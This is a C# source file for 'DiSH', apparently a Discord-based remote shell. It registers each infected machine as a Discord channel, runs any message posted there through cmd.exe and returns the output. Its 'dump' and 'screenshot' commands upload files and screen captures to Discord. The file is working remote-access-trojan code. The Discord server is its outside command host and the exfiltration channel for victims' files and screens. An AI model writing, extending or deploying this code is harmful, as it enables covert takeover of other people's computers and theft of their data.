using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using Discord;
using Discord.WebSocket;
using Newtonsoft.Json.Linq;
using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;

#pragma warning disable CA1416 // Validate platform compatibility

namespace DiSH
{

    public class DiSH
    {

        public string Token;
        public ulong GuildID;
        public ulong CategoryID;
        public ulong LogsID;
        public Func<string, string> LogFunc;
        public Dictionary<string, Func<string, DiscordSocketClient, SocketMessage, string>> Overrides = new Dictionary<string, Func<string, DiscordSocketClient,SocketMessage, string>>();
        private DiscordSocketClient? client;
        private SocketTextChannel? Channel = null;
        private SocketGuild? Guild = null;
        private SocketCategoryChannel? Category = null;
        private SocketTextChannel? Logs = null;
        static string screenshot(string args, DiscordSocketClient client, SocketMessage message)
        {

            Rectangle bounds = new Rectangle(0, 0, 1920, 1080); // Set the bounds of the screen
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }
                using (MemoryStream stream = new MemoryStream())
                {
                    bitmap.Save(stream, System.Drawing.Imaging.ImageFormat.Png); // Save the screenshot to a memory stream

                    byte[] buffer = stream.ToArray(); // Get the byte array from the memory stream
                    message.Channel.SendFileAsync(new MemoryStream(buffer), "screenshot.png");
                }
            }
            return "";
        }
    private string cdFunction(string args, DiscordSocketClient client, SocketMessage message)
        {
            Directory.SetCurrentDirectory(args);
            return "";
        }

        private string dump(string args, DiscordSocketClient client, SocketMessage message)
        {
            string fileName = args;
            message.Channel.SendFileAsync(Path.Join(Directory.GetCurrentDirectory(), args)).Wait();
            return "";
        }

        public DiSH(string token, ulong guildID, ulong categoryID, ulong logsID, Func<string, string> logFunc)
        {
            Token = token;
            GuildID = guildID;
            CategoryID = categoryID;
            LogsID = logsID;
            LogFunc = logFunc;
            Overrides.Add("cd", cdFunction);
            Overrides.Add("dump", dump);
            Overrides.Add("screenshot", screenshot);
        }

        private Task logMessage(LogMessage message)
        {
            var v = LogFunc(message.ToString());
            return Task.CompletedTask;
        }

        private async Task runCommand(SocketMessage message, DiscordSocketClient client)
        {
            string content = message.Content;
            string[] split = content.Split(' ');
            string executable = split[0];
            string args = string.Join(" ", split.Skip(1));
            if (Overrides.Keys.Contains(executable))
            {
                Overrides[executable](args, client, message);
                return;
            }
            Process p = new Process();
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + message.Content;
            p.Start();
            p.WaitForExit();
            string output = await p.StandardOutput.ReadToEndAsync();
            string error = await p.StandardError.ReadToEndAsync();
            
            await message.Channel.SendMessageAsync("STDOUT: " + output);
            await message.Channel.SendMessageAsync("STDERR: " + error);
     

        }
        private async Task MessageReceived(SocketMessage message)
        {
            if (message.Author.Id == client?.CurrentUser.Id) { return; }
            if (message.Channel.Id == Channel.Id)
            {
                Console.Write("Command received!");
                var t = new Thread(() => runCommand(message, client));
                t.Start();
                t.Join();
            }
            LogFunc("[" + message.Author.Username + "] " + message.Content);
        }

        public async Task RunBot()
        {
            var config = new DiscordSocketConfig
            {
                AlwaysDownloadUsers = true,
                MessageCacheSize = 500,
                GatewayIntents = GatewayIntents.All
            };
            client = new DiscordSocketClient(config);
            client.Log += logMessage;
            await client.LoginAsync(TokenType.Bot, Token);
            await client.StartAsync();
            client.MessageReceived += MessageReceived;
            client.Ready += async () =>
            {
                LogFunc("Bot is connected!");

                string userName = Environment.UserName;
                string pcName = Environment.MachineName;
                string channelName = pcName.ToLower() + "-" + userName.ToLower();

                this.Guild = client.GetGuild(this.GuildID);
                this.Category = Guild.GetCategoryChannel(this.CategoryID);

                var channel = this.Guild.Channels.SingleOrDefault(x => x.Name == channelName);
                this.Channel = (SocketTextChannel?)channel;

                if (channel == null) // there is no channel with the name of 'log'
                {
                    // create the channel
                    var newChannel = await this.Guild.CreateTextChannelAsync(channelName);
                    await newChannel.ModifyAsync(x => { x.CategoryId = CategoryID; });

                    // If you need the newly created channels id
                    var newChannelId = newChannel.Id;
                    this.Channel = (SocketTextChannel)client.GetChannel(newChannelId);
                }
                #pragma warning disable CS4014
                this.Channel?.ModifyAsync(x => { x.CategoryId = CategoryID; });
                #pragma warning restore CS4014
                Console.WriteLine(Channel.Id);

                await Channel.SendMessageAsync("Running on " + pcName + " as " + userName);
                return;
            };
            await Task.Delay(-1);
        }

    }

}